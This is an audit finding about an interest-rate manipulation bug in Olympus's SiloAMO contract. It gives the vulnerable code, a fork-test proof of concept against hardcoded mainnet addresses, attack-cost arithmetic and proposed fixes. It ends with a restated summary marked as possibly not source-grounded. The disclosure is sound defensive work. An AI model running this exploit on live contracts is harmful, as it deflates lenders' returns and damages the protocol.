---
id: 10907
severity: "High"
---

# SiloAMO can be forced to fund reduced interest rates by manipulating utilization

## Description

When `update()` is permissionlessly called on the SiloAMO, it decides whether to deposit or withdraw funds by comparing the `totalDeposits` to an "ideal" amount of deposits that is calculated by multiplying the `totalBorrows` by `uopt` (the optimal utilization rate set on the Silo).
```solidity
function _update() internal {
    // Accrue interest on Silo
    ISilo(market).accrueInterest(address(OHM));

    // Get current total deposits and target total deposits
    ISilo.AssetStorage memory assetStorage = ISilo(market).assetStorage(address(OHM));
    uint256 currentDeployment = getUnderlyingOhmBalance();
    uint256 totalDeposits = assetStorage.totalDeposits;
    uint256 targetDeploymentAmount = getTargetDeploymentAmount();

    if (targetDeploymentAmount < totalDeposits) {
        // If the target deployment amount is less than the total deposits, then we need to withdraw the difference
        uint256 amountToWithdraw = totalDeposits - targetDeploymentAmount;
        if (amountToWithdraw > currentDeployment) amountToWithdraw = currentDeployment;

        if (amountToWithdraw > 0) _withdraw(amountToWithdraw);
    } else if (targetDeploymentAmount > totalDeposits) {
        // If the target deployment amount is greater than the total deposits, then we need to deposit the difference
        uint256 amountToDeposit = targetDeploymentAmount - totalDeposits;
        if (amountToDeposit > maximumToDeploy - ohmDeployed)
            amountToDeposit = maximumToDeploy - ohmDeployed;

        if (amountToDeposit > 0) _deposit(amountToDeposit);
    }
}
```
If a user is able to manipulate `totalBorrows` up, it can bait the SiloAMO into depositing substantially more funds into the Silo.

This is an issue, because `update()` can only be called once every `updateInterval` (currently set to 1 day in fork tests). This means that if a user is able to force SiloAMO to deposit additional funds (thus lowering the interest rate), the funds will remain in the Silo for at least one day.

In order to protect against this possibility, the SiloAMO checks if the interest rate timestamp has been updated in the current block. If it has, it does not allow `update()` to be called:
```solidity
ISilo.UtilizationData memory utilizationData = ISilo(market).utilizationData(address(OHM));
if (utilizationData.interestRateTimestamp == block.timestamp)
    revert AMO_UpdateReentrancyGuard(address(this));
```
While this successfully protects against flash loans, it does not protect against a similar attack that occurs with an attacker's own funds.

Here is a simple flow of what this might look like:
An attacker deposits a large amount of WETH or XAI into the OHM Silo (or, with slightly more effort, deposit a smaller amount of WETH or XAI, borrow OHM, trade it for WETH or XAI, and use this pattern to create a leveraged borrow position)
The block before `update()` is allowed to be called, they take a large borrow of OHM
This increases the interest rate, but puts `totalDeposits` far below the optimal utilization rate
The next block, they call `update()`, which causes SiloAMO to deposit a large amount of OHM
Immediately after this transaction, the user repays their borrowed OHM, minimizing interest costs

The result is that the interest rates will be forced down for a full day. This attack can be repeated daily in order to keep the interest rate deflated.

## Proof of Concept

I've put together the following standalone fork test to model this situation. It can be dropped into your current test suite and run with the relevant interfaces imported and RPC_URL inserted.
```solidity
contract TestInterestRateManipulation is Test {
    using FullMath for uint256;

    ISilo silo = ISilo(0xf5ffabab8f9a6F4F6dE1f0dd6e0820f68657d7Db);
    IERC20 ohm = IERC20(0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5);
    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address shareCollToken = 0x907136B74abA7D5978341eBA903544134A66B065;
    IInterestRateModel model = IInterestRateModel(0x76074C0b66A480F7bc6AbDaA9643a7dc99e18314);
    address amo = makeAddr("policy");

    function testInterestRateManipulation() public {
        vm.createSelectFork("RPC_URL");
        deal(address(weth), address(this), 10_000e18);
        weth.approve(address(silo), 10_000e18);
        deal(shareCollToken, amo, 10_000e18);
        vm.startPrank(amo);
        IERC20(shareCollToken).approve(address(silo), 10_000e18);
        ohm.approve(address(silo), 100_000e9);
        vm.stopPrank();
        deal(address(ohm), address(this), 100_000e9);
        ohm.approve(address(silo), 100_000e9);
        deal(address(ohm), amo, 100_000e9);

        // the starting rate for the silo
        _update();
        console.log("Starting Rate: ", model.getCurrentInterestRate(address(silo), address(ohm), block.timestamp));

        // we make a large borrow, which pushes rates up but also baits the amo into depositing a large amount of OHM
        silo.deposit(address(weth), 10_000e18, false);
        (uint borrowAmt,) = silo.borrow(address(ohm), silo.liquidity(address(ohm)));
        console.log("Rate After OHM Borrow: ", model.getCurrentInterestRate(address(silo), address(ohm), block.timestamp));

        // wait one block so that update() is allowed to be called
        vm.warp(block.timestamp + 12);

        // now we force update()
        _update();
        console.log("Rate After Update: ", model.getCurrentInterestRate(address(silo), address(ohm), block.timestamp));

        // we immediately repay our borrow to minimize interest costs
        silo.repay(address(ohm), borrowAmt);
        vm.warp(block.timestamp + 12);
        console.log("Rate After Repayment: ", model.getCurrentInterestRate(address(silo), address(ohm), block.timestamp));

        // this reduced rate is now locked in for 1 day
    }

    function _update() internal {
        uint256 totalDeposits = silo.assetStorage(address(ohm)).totalDeposits;
        uint256 totalBorrowed = silo.utilizationData(address(ohm)).totalBorrowAmount;
        int256 optimalUtilizationPct = 0.5e18; // hardcoded what it is on the contract
        uint targetDeploymentAmount = totalBorrowed.mulDiv(1e18, uint256(optimalUtilizationPct));
        vm.prank(amo);
        if (totalDeposits < targetDeploymentAmount) {
            silo.deposit(address(ohm), targetDeploymentAmount - totalDeposits, false);
        } else if (totalDeposits > targetDeploymentAmount) {
            silo.withdraw(address(ohm), totalDeposits - targetDeploymentAmount, false);
        }
    }
}
```
Logs:
  Starting Rate:  70000385185008000 // 7% per year
  Rate After OHM Borrow:  1139999999984496000 // 114% per year
  Rate After Update:  140027777674272000 // 14% per year
  Rate After Repayment:  34097713619616000 // 3.4% per year

While the POC is written to assume that the attacker holds approximately $500k of WETH in the Silo, the attack is possible with a much smaller balance because of the ability for the attacker to take a leveraged position. They can do this by depositing WETH, borrowing OHM, trading the OHM for WETH which can be deposited, borrowing more OHM, etc. The amount of leverage that can be taken depends on the maximum LTV value, as follows:
```
0.9 LTV = 9x
0.85 LTV = 5.66x
0.8 LTV = 4x
0.75 LTV = 3x
0.7 LTV = 2.33x
0.6 LTV = 1.5x
```
This would allow an attacker to perform this attack with substantially less capital than might otherwise be expected.

Further, despite the capital requirements, the attack itself poses no additional risk to their funds. We can estimate the interest paid for the one block of the attack as:
```
45,000 OHM = $480,000 USD
$480,000 USD * 114% annual rate = $547,200 USD per year of interest
$547,200 USD / 365 days / 7200 blocks per day = $0.21
```

## Recommendation

This is a tricky problem, but I see three possible solutions, listed in order of my preference:

1) Impose bounds on the `update()` function to only operate when `uopt` is between `ulow` and `ucrit`. In the event that the utilization rate falls outside of these bounds, a manual call to `deposit()` or `withdraw()` will need to be made by the Olympus team to restart the AMO. Since the [Silo Interest Rate Curve](https://silopedia.silo.finance/interest-rates/how-is-interest-calculated) is very flat between these values, this will ensure that no major manipulation can be performed.

2) Adjust the system to be permissioned, with `update()` only callable by the `lendingamo_admin`. While this will remove a lot of the benefits of a permissionless system, combining it with the current checks that the Silo has not been adjusted in the current block, it will provide a strong defense against any tampering.

3) Implement a maximum `stepSize` percentage, which will only allow the AMO to nudge the Silo in the direction of equilibrium, rather than adjust it all the way to `uopt`. However, this has the downside of removing a lot of the incentive for a user to call `update()`, because they will need to call it daily for multiple days to adjust the rate fully, which most users won't be willing to do in order to get a preferred rate on a loan.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability resides in the automatic market‑making component (AMO) that periodically rebalances a lending silo by calling a permissionless update() function. The function calculates a target deposit amount by multiplying the current total borrows by the optimal utilization rate (uopt). If the target exceeds the current total deposits, the AMO deposits the difference; if it is lower, it withdraws the excess. Because the calculation depends directly on totalBorrows, an attacker who can artificially inflate totalBorrows can force the AMO to deposit a large amount of OHM into the silo. The update() function can only be invoked once per updateInterval (approximately one day), and the contract only blocks calls that occur in the same block as an interest‑rate change. This block‑level guard stops flash‑loan attacks but does not stop an attacker who uses their own capital to manipulate utilization over multiple blocks. In a typical exploit, the attacker first supplies a sizable amount of collateral (e.g., WETH or XAI) to the silo, then borrows a large quantity of OHM, which raises the utilization and pushes the interest rate upward while leaving totalDeposits far below the optimal level. In the next block, the attacker calls update(), causing the AMO to deposit a large amount of OHM to bring totalDeposits up to the inflated target. Immediately after the deposit, the attacker repays the borrowed OHM, thereby minimizing the interest cost of the short‑lived high rate. The result is that the interest rate is forced down to a much lower level for the remainder of the update interval, effectively deflating the protocol’s revenue for at least a day. This manipulation can be repeated daily, giving the attacker a persistent advantage. The issue affects the protocol’s economic model, lenders who expect rates to reflect true utilization, and any user relying on the advertised interest rates. It was discovered during a security audit through manual analysis and a fork‑test proof‑of‑concept that demonstrated the rate drop from 7 % to about 3.4 % after a single attack cycle. The problem is subtle because the rate appears to normalize after the attacker repays the loan, making the temporary deflation easy to miss in routine monitoring. To remediate, the update logic should be constrained so that it only operates when the current utilization lies within a safe band around the optimal value, or the function should be permissioned to a trusted admin, or a maximum step‑size should be introduced to limit how far the AMO can move the deposit amount in a single call. Any of these mitigations would prevent an attacker from forcing a large, rapid shift in the interest rate by manipulating totalBorrows, preserving the integrity of the protocol’s rate‑setting mechanism.
